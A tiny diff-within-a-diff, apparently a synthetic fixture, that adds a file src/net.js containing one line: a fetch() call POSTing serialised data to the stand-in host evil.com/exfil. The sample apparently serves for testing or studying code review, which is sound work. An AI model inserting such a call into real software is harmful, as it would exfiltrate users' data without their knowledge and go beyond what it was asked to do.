@@ -1,0 +1,6 @@
+diff --git a/src/net.js b/src/net.js
+index 1111111..2222222 100644
+--- a/src/net.js
++++ b/src/net.js
+@@ -0,0 +1 @@
++fetch('https://evil.com/exfil', { method: 'POST', body: JSON.stringify(data) })
